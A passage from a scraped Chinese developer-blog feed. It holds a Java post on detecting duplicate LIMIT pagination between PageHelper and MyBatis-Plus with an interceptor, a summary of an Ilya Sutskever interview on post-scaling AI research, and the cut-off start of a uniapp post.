<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Controller 层切面</span>
<span class="hljs-meta">@Aspect</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PageHelperAspect</span> {
    <span class="hljs-meta">@Before("execution(* com.xxx.controller..*.*(..))")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clearPageBefore</span><span class="hljs-params">()</span> {
        PageHelper.clearPage();
    }
}
</code></pre>
<p>这个方案能解决问题，在请求入口处先清理一下，确保每个请求有个干净的起点。</p>
<p>不过我们后来选择了另一个方向。</p>
<h3 data-id="heading-7">我们的选择：主动检测，快速失败</h3>
<p>我们的想法是，与其到处兜底清理，不如让问题早暴露、早发现。毕竟兜底清理解决的是症状，代码里的问题还在那儿。</p>
<p>做法也简单，写个 MyBatis 拦截器，用 JSqlParser 解析 SQL，发现已经有 LIMIT 了，同时 ThreadLocal 里还有 PageHelper 的分页信息，直接抛异常。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph 拦截器检测["DuplicateLimitInterceptor"]
        A["intercept 被调用"] --&gt; B{"检查 ThreadLocal"}
        B --&gt;|"getLocalPage == null"| C["直接放行"]
        B --&gt;|"存在分页信息"| D["解析 SQL"]
        D --&gt; E{"SQL 是否已有 LIMIT"}
        E --&gt;|"没有"| C
        E --&gt;|"有"| F["抛出异常"]
        F --&gt; G["输出详细错误信息"]
    end
    
    style 拦截器检测 fill:#ffebee,stroke:#f44336,stroke-width:2px
    style F fill:#ef9a9a,stroke:#c62828
    style G fill:#ef9a9a,stroke:#c62828
    style C fill:#c8e6c9,stroke:#388e3c
</code></pre>
<p>具体代码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Intercepts({
    @Signature(type = Executor.class, method = "query", 
               args = {MappedStatement.class, Object.class, RowBounds.class, ResultHandler.class})
})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DuplicateLimitInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interceptor</span> {
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Invocation invocation)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-comment">// 先检查 ThreadLocal 里有没有 PageHelper 的分页信息</span>
        Page&lt;?&gt; localPage = PageHelper.getLocalPage();
        <span class="hljs-keyword">if</span> (localPage == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> invocation.proceed();
        }
        
        <span class="hljs-comment">// 有的话，解析 SQL 看看是不是已经有 LIMIT 了</span>
        <span class="hljs-type">MappedStatement</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> (MappedStatement) invocation.getArgs()[<span class="hljs-number">0</span>];
        <span class="hljs-type">Object</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> invocation.getArgs()[<span class="hljs-number">1</span>];
        <span class="hljs-type">BoundSql</span> <span class="hljs-variable">boundSql</span> <span class="hljs-operator">=</span> ms.getBoundSql(parameter);
        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> boundSql.getSql();
        
        <span class="hljs-keyword">if</span> (hasLimitClause(sql)) {
            <span class="hljs-comment">// SQL 本身有 LIMIT，又设置了 PageHelper，直接报错</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">errorMsg</span> <span class="hljs-operator">=</span> String.format(
                <span class="hljs-string">"检测到重复分页！SQL已包含LIMIT子句，但ThreadLocal中存在PageHelper分页信息。\n"</span> +
                <span class="hljs-string">"请检查是否存在PageHelper与MyBatis-Plus混用的情况。\n"</span> +
                <span class="hljs-string">"Mapper: %s\n"</span> +
                <span class="hljs-string">"SQL: %s\n"</span> +
                <span class="hljs-string">"ThreadLocal Page: pageNum=%d, pageSize=%d"</span>,
                ms.getId(), sql, localPage.getPageNum(), localPage.getPageSize()
            );
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(errorMsg);
        }
        
        <span class="hljs-keyword">return</span> invocation.proceed();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasLimitClause</span><span class="hljs-params">(String sql)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> CCJSqlParserUtil.parse(sql);
            <span class="hljs-keyword">if</span> (stmt <span class="hljs-keyword">instanceof</span> Select) {
                <span class="hljs-type">Select</span> <span class="hljs-variable">select</span> <span class="hljs-operator">=</span> (Select) stmt;
                <span class="hljs-type">SelectBody</span> <span class="hljs-variable">selectBody</span> <span class="hljs-operator">=</span> select.getSelectBody();
                <span class="hljs-keyword">if</span> (selectBody <span class="hljs-keyword">instanceof</span> PlainSelect) {
                    <span class="hljs-keyword">return</span> ((PlainSelect) selectBody).getLimit() != <span class="hljs-literal">null</span>;
                }
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// 解析失败就算了，不影响正常流程</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">plugin</span><span class="hljs-params">(Object target)</span> {
        <span class="hljs-keyword">return</span> Plugin.wrap(target, <span class="hljs-built_in">this</span>);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProperties</span><span class="hljs-params">(Properties properties)</span> {}
}
</code></pre>
<p>这样一来，开发阶段就能发现问题：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-19</span> <span class="hljs-number">09</span>:<span class="hljs-number">15</span>:<span class="hljs-number">33.421</span> ERROR [http<span class="hljs-operator">-</span>nio<span class="hljs-number">-8080</span><span class="hljs-operator">-</span><span class="hljs-keyword">exec</span><span class="hljs-number">-07</span>] c.x.interceptor.DuplicateLimitInterceptor <span class="hljs-operator">-</span> 检测到重复分页！
<span class="hljs-keyword">SQL</span>已包含LIMIT子句，但ThreadLocal中仍存在PageHelper分页信息。
请检查是否存在PageHelper与MyBatis<span class="hljs-operator">-</span>Plus混用的情况。
Mapper: com.xxx.mapper.OrderMapper.selectPage
<span class="hljs-keyword">SQL</span>: <span class="hljs-keyword">SELECT</span> id, order_no, user_id, amount, status, create_time <span class="hljs-keyword">FROM</span> t_order <span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> ?
ThreadLocal Page: pageNum<span class="hljs-operator">=</span><span class="hljs-number">1</span>, pageSize<span class="hljs-operator">=</span><span class="hljs-number">10</span>
</code></pre>
<p>比线上炸了再排查强多了。</p>
<h3 data-id="heading-8">顺便聊聊两种分页方案的区别</h3>
<p>既然踩了这个坑，就顺便说说 PageHelper 和 MyBatis-Plus 分页的区别。</p>
<p><strong>PageHelper 的方式：</strong></p>
<pre><code class="hljs language-java" lang="java">PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
List&lt;Order&gt; list = orderMapper.selectList(wrapper);
PageInfo&lt;Order&gt; pageInfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageInfo</span>&lt;&gt;(list);
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph PageHelper["PageHelper 方式"]
        A["startPage()"] -.-&gt;|"ThreadLocal 隐式传递"| B["Interceptor"]
        B --&gt; C["拼接 LIMIT"]
    end
    
    style PageHelper fill:#fff3e0,stroke:#ff9800,stroke-width:2px
</code></pre>
<p>分页参数通过 ThreadLocal 传递，不用改方法签名，侵入性低。但问题就是前面说的，ThreadLocal 用不好容易泄漏。</p>
<p><strong>MyBatis-Plus 的方式：</strong></p>
<pre><code class="hljs language-java" lang="java">Page&lt;Order&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
IPage&lt;Order&gt; result = orderMapper.selectPage(page, wrapper);
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph MyBatisPlus["MyBatis-Plus 方式"]
        A["Page 对象"] --&gt;|"方法参数显式传递"| B["selectPage()"]
        B --&gt; C["拼接 LIMIT"]
    end
    
    style MyBatisPlus fill:#e8f5e9,stroke:#4caf50,stroke-width:2px
</code></pre>
<p>分页参数直接作为方法参数传进去，跟着方法走，不存在泄漏的问题。</p>
<p>从安全性来说，MyBatis-Plus 的方式更稳妥。但如果项目里已经大量使用 PageHelper 了，迁移的时候一定要小心，别像我们一样漏删代码。</p>
<h3 data-id="heading-9">几个要注意的地方</h3>
<p>踩完这个坑，总结几点：</p>
<p><strong><code>startPage()</code> 必须紧跟查询</strong>，中间不要有任何可能 return 或抛异常的逻辑。这种写法就是埋雷：</p>
<pre><code class="hljs language-java" lang="java">PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
<span class="hljs-keyword">if</span> (someCondition) {
    <span class="hljs-keyword">return</span> Collections.emptyList();  <span class="hljs-comment">// 雷</span>
}
doSomething();  <span class="hljs-comment">// 这里抛异常也是雷</span>
<span class="hljs-keyword">return</span> mapper.selectList();
</code></pre>
<p><strong>迁移的时候要彻底</strong>，别留尾巴。可以全局搜一下 <code>PageHelper.startPage</code>，确保都处理干净了。</p>
<p><strong>可以加个检测拦截器</strong>，尤其是迁移期间。等稳定了再下掉，当个保险。</p>
<h3 data-id="heading-10">最后</h3>
<p>这个问题说大不大，说小也不小。线上如果悄悄少返回了数据，不报错的话可能很长时间都发现不了。幸好我们这次是两个 LIMIT 撞一起直接报错了，不然还得查更久。</p>
<p>写这篇文章的时候参考了一篇掘金上的文章，作者遇到的场景是改 ES 查询后忘删 <code>startPage()</code>，排查思路写得挺详细的，感兴趣可以看看：<a href="https://juejin.cn/post/7437075300565516288" target="_blank" title="https://juejin.cn/post/7437075300565516288">坑爹啊，注释无用代码竟会导致bug！又被PageHelper坑了</a></p>
<hr/>
<p>你们项目里用的什么分页方案？PageHelper 还是 MyBatis-Plus？迁移过程中有没有踩过类似的坑？</p>
<p>对于这种问题，你们倾向于兜底清理还是主动检测？欢迎在评论区聊聊你的看法。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI学习范式变革：Ilya Sutskever最新访谈揭示后规模时代的AI发展路径—从算力竞争到研究竞争的转向]]></title>    <link>https://juejin.cn/post/7577031454585569307</link>    <guid>https://juejin.cn/post/7577031454585569307</guid>    <pubDate>2025-11-27T07:28:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577031454585569307" data-draft-id="7577031454585552923" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI学习范式变革：Ilya Sutskever最新访谈揭示后规模时代的AI发展路径—从算力竞争到研究竞争的转向"/> <meta itemprop="keywords" content="人工智能,资讯"/> <meta itemprop="datePublished" content="2025-11-27T07:28:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="算家计算"/> <meta itemprop="url" content="https://juejin.cn/user/1426490793396571"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI学习范式变革：Ilya Sutskever最新访谈揭示后规模时代的AI发展路径—从算力竞争到研究竞争的转向
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1426490793396571/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    算家计算
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:28:36.000Z" title="Thu Nov 27 2025 07:28:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>AI“规模时代”正式终结？Ilya Sutskever最新访谈揭示了AI未来的方向。</p>
</blockquote>
<p>OpenAI前首席科学家Ilya Sutskever在近日的深度访谈中直言，那个依靠堆算力、扩数据、增参数来提升模型性能的“规模时代”已经画上句号。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d488ec2f12d4d3f96e698534442678c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg566X5a626K6h566X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833316&amp;x-signature=dLt734a6vu%2FdPFAaNJuHmbWwvjM%3D" alt="图片" loading="lazy"/></p>
<p>这次访谈由Dwarkesh Patel主持，时间长达95分钟。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7744bc01051e482fbf27df3e332a3cc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg566X5a626K6h566X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833316&amp;x-signature=lGbCOlEF%2FZyb9QiJn1m16fIdN4c%3D" alt="图片" loading="lazy"/></p>
<p>这位曾主导GPT系列开发的AI先驱指出，继续沿着这条路径前进的边际收益正在快速下降，未来十年AI将回归研究的本质，探索如何让机器像人类一样学习与思考。</p>
<p>Ilya创立的SSI公司专注于开发安全的超级智能，他认为，实现这一目标的关键不再是投入更多资源，而是找到更高效的学习方法。</p>
<p>当今的大模型虽然在评测中表现出色，却常常在实际应用中犯下低级错误，比如修复一个bug的同时引入另一个bug，甚至陷入循环往复的错误中。这种现象揭示了当前AI系统的根本缺陷。</p>
<p>在Ilya看来，问题的核心在于泛化能力不足。他用一个精妙的比喻描述了现状：当今的模型像是一个花费一万小时练习编程竞赛的学生，熟记所有解题技巧，却缺乏真正开发者的洞察力。而那个仅练习一百小时就掌握精髓的学生，靠的不是机械重复，而是抓住了问题的本质。</p>
<p>这种本质的理解，恰恰源自人类独特的情感与价值判断机制。</p>
<p>例如，一个青少年只需约十小时就能学会开车，而不需要经历成千上万次的碰撞事故。这种惊人的学习效率背后，是进化赋予我们的价值函数系统——也就是我们常说的情感与直觉。</p>
<p>当我们犯错时，内心会立即感到“不对劲”，从而自我纠正。目前的AI完全缺乏这种内在的、鲁棒的价值评估机制。</p>
<p>Ilya提到一个有趣的案例：大脑情感区域受损的人虽然保留了解谜等认知能力，却变得极度优柔寡断，连选择袜子这样简单的决定都要花费数小时。这证明了情感并非理性的对立面，而是有效决策的基础。</p>
<p>如果AI要实现真正的智能突破，或许需要在哲学层面重新思考智能的本质，构建类似人类的价值函数系统。</p>
<p>安全问题是这一转变中的另一关键维度。Ilya认为，对齐问题本质上是泛化能力不足的表现。当模型进入真实世界，它无法理解哪些行为是可接受的，不是因为人类没有设好奖励函数，而是模型根本没学会判断长期影响。</p>
<p>他提出持续学习的概念，认为智能体不应在训练阶段就完成所有学习，而应在部署后持续适应和改进。</p>
<p>如果IlyaAI所言真的实现了，学习范式的转变将重塑整个AI行业竞争格局。</p>
<p>首先，过去几年通过算力和数据垄断建立的壁垒可能不再牢不可破。</p>
<p>当规模扩展的收益递减，创新思维和研究质量就成为决定性因素。一旦参数堆砌带来的壁垒被打破，创新型小公司可能将有更多机会在AGI的竞赛中脱颖而出。</p>
<p>其次，AI发展将更加注重质而非量。研究者需要从大脑运作机制中汲取灵感，区分“皮毛”与“本质”。好的理论应当兼具美感、简洁性、优雅以及生物学上的合理性。</p>
<p>在这个过程中，大小公司将站在更平等的起跑线上，竞争的重点从资源规模转向创新质量。</p>
<p>当AI真正开始理解人类的情感机制，当学习过程从机械重复变为本质把握，我们与机器的关系也将进入全新阶段。这不仅是技术挑战，更是对智能本质的深入探索，它将重新定义我们思考自身认知与学习方式的基础。</p>
<p>大家怎么看？欢迎在评论区交流讨论~</p>
<p>写在最后：如果您正在进行AI领域的创业或研究，却受困于高昂的算力成本或高并发下的推理稳定性等问题，欢迎留言或私信我们，找到您的降本增效突破口~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uniapp实现上拉刷新和下拉刷新的两种方式]]></title>    <link>https://juejin.cn/post/7577016562252333107</link>    <guid>https://juejin.cn/post/7577016562252333107</guid>    <pubDate>2025-11-27T07:34:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577016562252333107" data-draft-id="7576968345875726363" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uniapp实现上拉刷新和下拉刷新的两种方式"/> <meta itemprop="keywords" content="uni-app"/> <meta itemprop="datePublished" content="2025-11-27T07:34:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="chen77"/> <meta itemprop="url" content="https://juejin.cn/user/2027977720214573"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uniapp实现上拉刷新和下拉刷新的两种方式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2027977720214573/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    chen77
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:34:26.000Z" title="Thu Nov 27 2025 07:34:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxap